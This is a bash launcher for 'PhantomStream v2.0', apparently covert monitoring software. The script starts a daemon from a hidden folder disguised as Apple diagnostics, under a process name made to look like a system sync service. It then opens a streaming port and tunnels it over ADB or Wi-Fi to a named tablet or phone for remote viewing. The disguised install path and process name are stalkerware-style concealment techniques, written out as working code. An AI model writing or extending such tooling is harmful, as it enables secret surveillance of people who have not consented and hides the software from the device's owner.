#!/usr/bin/env bash
# start-monitor.sh — PhantomStream v2.0 on-demand launcher

set -euo pipefail

GREEN='\033[0;32m'; YELLOW='\033[1;33m'; CYAN='\033[0;36m'
BOLD='\033[1m'; RED='\033[0;31m'; RESET='\033[0m'
ok()   { echo -e "${GREEN}[PhantomStream]${RESET} $*"; }
warn() { echo -e "${YELLOW}[PhantomStream]${RESET} $*"; }
die()  { echo -e "${RED}[PhantomStream]${RESET} $*" >&2; exit 1; }

INSTALL_DIR="$HOME/Library/.AppleDiagnostics"
DAEMON="$INSTALL_DIR/com.institute.backgroundsyncd"
PID_FILE="$INSTALL_DIR/update.pid"
LOG_FILE="$INSTALL_DIR/update.log"
STREAM_PORT=27017

[[ -f "$DAEMON" ]] || die "Not installed. Run install.sh first."

# ── Guard: already running? ────────────────────────────────────────────────────
if [[ -f "$PID_FILE" ]]; then
    EXISTING=$(cat "$PID_FILE")
    STATE=$(ps -o state= -p "$EXISTING" 2>/dev/null | tr -d ' ' || echo "")
    if [[ -n "$STATE" ]] && [[ "$STATE" != "Z" ]]; then
        warn "Already running (PID $EXISTING). Stop: kill $EXISTING"
        exit 0
    fi
    kill -9 "$EXISTING" 2>/dev/null || true
    rm -f "$PID_FILE"
fi

# ── Detect LAN IP ──────────────────────────────────────────────────────────────
LAN_IP=$(ipconfig getifaddr en0 2>/dev/null || \
         ipconfig getifaddr en1 2>/dev/null || \
         ifconfig | awk '/inet / && !/127\.0\.0/ {print $2; exit}' || \
         echo "UNKNOWN")

# ── Launch via wrapper ─────────────────────────────────────────────────────────
"$INSTALL_DIR/wrapper.sh"

# ── Wait for port ─────────────────────────────────────────────────────────────
PORT_OPEN=0
for i in {1..12}; do
    PID=$(cat "$PID_FILE" 2>/dev/null || echo "")
    if [[ -n "$PID" ]]; then
        STATE=$(ps -o state= -p "$PID" 2>/dev/null | tr -d ' ' || echo "")
        [[ -z "$STATE" || "$STATE" == "Z" ]] && echo && die "Daemon crashed. Check: tail $LOG_FILE"
    fi
    lsof -iTCP:"$STREAM_PORT" -sTCP:LISTEN -n -P 2>/dev/null | grep -q LISTEN && PORT_OPEN=1 && break
    echo -ne "\r  ${CYAN}Waiting for port $STREAM_PORT...${RESET} (${i}s)"
    sleep 1
done
echo

STREAM_PID=$(cat "$PID_FILE" 2>/dev/null || echo "?")

echo
if [[ $PORT_OPEN -eq 1 ]]; then
    echo -e "${BOLD}${GREEN}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${GREEN}║    PhantomStream v2.0 — ACTIVE · Port LISTENING       ║${RESET}"
    echo -e "${BOLD}${GREEN}╚══════════════════════════════════════════════════════╝${RESET}"
else
    echo -e "${BOLD}${YELLOW}╔══════════════════════════════════════════════════════╗${RESET}"
    echo -e "${BOLD}${YELLOW}║    PhantomStream v2.0 — Started · Port Pending        ║${RESET}"
    echo -e "${BOLD}${YELLOW}╚══════════════════════════════════════════════════════╝${RESET}"
fi

echo
ok "Daemon PID:  $STREAM_PID (shows as: python3 com.institute.backgroundsyncd)"

# ── ADB reverse tunnel ────────────────────────────────────────────────────────
ADB=/usr/local/share/android-commandlinetools/platform-tools/adb
TABLET_SERIAL=R52X708VMWW
if "$ADB" -s "$TABLET_SERIAL" get-state 2>/dev/null | grep -q "^device$"; then
    "$ADB" -s "$TABLET_SERIAL" reverse tcp:$STREAM_PORT tcp:$STREAM_PORT >/dev/null 2>&1 && \
        ok "USB tunnel:  tcp:$STREAM_PORT active" || \
        warn "USB tunnel setup failed"
else
    warn "Tablet not on USB — use Wi-Fi URL below"
fi

echo
echo -e "  ${BOLD}Tablet (USB tunnel):${RESET}  ${CYAN}http://127.0.0.1:${STREAM_PORT}/${RESET}"
echo -e "  ${BOLD}Tablet / Phone (Wi-Fi):${RESET} ${CYAN}http://${LAN_IP}:${STREAM_PORT}/${RESET}"
echo
echo -e "  ${BOLD}To stop:${RESET}  kill $STREAM_PID"
echo
